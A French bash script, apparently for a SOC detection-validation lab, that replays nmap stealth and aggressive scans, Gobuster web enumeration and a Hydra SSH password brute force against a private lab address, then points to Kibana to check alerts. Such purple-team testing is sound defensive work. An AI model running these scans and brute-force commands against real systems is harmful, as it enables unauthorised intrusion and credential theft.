#!/bin/bash

# ==============================================================================
# Script : replay-scenarios.sh
# Projet : SENTRA - Détection & Validation
# Description : Automatise la génération d'attaques pour valider les alertes SOC
# ==============================================================================

# Variables de configuration
CIBLE="192.168.20.10"
USER_SSH="sentra"
WORDLIST_SSH="wordlist_ssh.txt" # Assure-toi que ce fichier existe dans le même dossier
WORDLIST_WEB="/usr/share/wordlists/dirb/common.txt"
TEMPS_PAUSE=10 # Temps en secondes entre chaque attaque

echo "========================================================="
echo "[+] DEBUT DES SCENARIOS D'ATTAQUE SENTRA SUR : $CIBLE"
echo "========================================================="
echo "Heure de début : $(date '+%Y-%m-%d %H:%M:%S')"
echo ""

# ---------------------------------------------------------
# SCENARIO 1 : RECONNAISSANCE NMAP (Scan Furtif / Xmas / Version)
# ---------------------------------------------------------
echo "[1/3] Lancement des scans Nmap (Reconnaissance)..."

echo "   -> Nmap : Scan Xmas (T1595)"
# On cible les ports 22 et 80 pour aller vite. Adapte si besoin.
nmap -Pn -sX -T5 --max-retries 0 -p 22,80 $CIBLE > /dev/null
echo "   -> Terminé."
sleep 2

echo "   -> Nmap : Scan de Vulnérabilités / Scripts (T1595.002)"
# Scan bruyant pour déclencher les alertes ET SCAN de la communauté
nmap -Pn -sS -sV -A -T4 -p 22,80 $CIBLE > /dev/null
echo "   -> Terminé."

echo "=> Pause de $TEMPS_PAUSE secondes pour séparer les événements dans les logs..."
sleep $TEMPS_PAUSE
echo ""


# ---------------------------------------------------------
# SCENARIO 2 : ATTAQUE WEB (Enumeration de répertoires)
# ---------------------------------------------------------
echo "[2/3] Lancement de l'énumération Web Gobuster (T1595.003)..."
echo "   -> Cible : http://$CIBLE"
echo "   -> Dictionnaire : $WORDLIST_WEB"

# L'option -q (quiet) réduit la sortie pour ne pas inonder le terminal
gobuster dir -u http://$CIBLE -w $WORDLIST_WEB -q
echo "   -> Terminé."

echo "=> Pause de $TEMPS_PAUSE secondes pour séparer les événements..."
sleep $TEMPS_PAUSE
echo ""


# ---------------------------------------------------------
# SCENARIO 3 : ACCES AUX IDENTIFIANTS (Brute-Force SSH)
# ---------------------------------------------------------
echo "[3/3] Lancement du Brute-Force SSH Hydra (T1110.001)..."
echo "   -> Cible : ssh://$CIBLE"
echo "   -> Utilisateur visé : $USER_SSH"

# Vérification de l'existence de la wordlist SSH locale
if [ -f "$WORDLIST_SSH" ]; then
    # L'option -I évite à Hydra de demander confirmation
    hydra -I -l $USER_SSH -P $WORDLIST_SSH ssh://$CIBLE -t 4 > /dev/null 2>&1
    echo "   -> Terminé."
else
    echo "   -> /!\ ERREUR : Le fichier $WORDLIST_SSH est introuvable dans ce dossier."
    echo "      Crée un petit dictionnaire ('nano $WORDLIST_SSH') avec quelques mots de passe factices pour tester l'alerte."
fi

echo ""
echo "========================================================="
echo "[+] FIN DES SCENARIOS D'ATTAQUE"
echo "========================================================="
echo "Heure de fin : $(date '+%Y-%m-%d %H:%M:%S')"
echo "Vérifiez maintenant votre tableau de bord Kibana."